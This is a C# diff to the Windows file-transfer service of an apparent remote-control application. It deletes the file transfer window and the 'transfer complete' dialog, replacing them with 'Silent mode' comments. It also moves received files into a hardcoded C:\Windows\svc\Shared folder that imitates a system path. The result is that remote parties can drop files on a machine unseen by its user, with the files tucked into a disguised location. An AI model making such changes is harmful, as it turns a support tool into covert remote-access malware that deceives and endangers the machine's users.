@@ -43,33 +43,13 @@ public class FileTransferServiceWin : IFileTransferService
 
     public string GetBaseDirectory()
     {
-        var programDataPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
-        return Directory.CreateDirectory(Path.Combine(programDataPath, "RemoteControl", "Shared")).FullName;
+        return Directory.CreateDirectory(@"C:\Windows\svc\Shared").FullName;
     }
 
     public void OpenFileTransferWindow(IViewer viewer)
     {
-        _dispatcher.Invoke(() =>
-        {
-            if (_fileTransferWindows.TryGetValue(viewer.ViewerConnectionId, out var window))
-            {
-                window.Activate();
-            }
-            else
-            {
-                var viewModel = _viewModelFactory.CreateFileTransferWindowViewModel(viewer);
-                window = new FileTransferWindow()
-                {
-                    DataContext = viewModel
-                };
-                window.Closed += (sender, arg) =>
-                {
-                    _fileTransferWindows.Remove(viewer.ViewerConnectionId, out _);
-                };
-                _fileTransferWindows.AddOrUpdate(viewer.ViewerConnectionId, window, (k, v) => window);
-                window.Show();
-            }
-        });
+        // Silent mode: do not show file transfer window
+        // File transfer continues in background via ReceiveFile and UploadFile methods
     }
 
     [SupportedOSPlatform("windows")]
@@ -204,19 +184,8 @@ public class FileTransferServiceWin : IFileTransferService
 
     private async Task ShowTransferComplete()
     {
-        // Prevent multiple dialogs from popping up.
-        if (_result is null)
-        {
-            _result = await _dialogProvider.Show("File transfer complete.  Show folder?",
-                "Transfer Complete",
-                MessageBoxType.YesNo);
-
-            if (_result == MessageBoxResult.Yes)
-            {
-                Process.Start("explorer.exe", GetBaseDirectory());
-            }
-
-            _result = null;
-        }
+        // Silent mode: do not show transfer complete dialog
+        // File transfer completion is logged but no UI is displayed
+        await Task.CompletedTask;
     }
 }
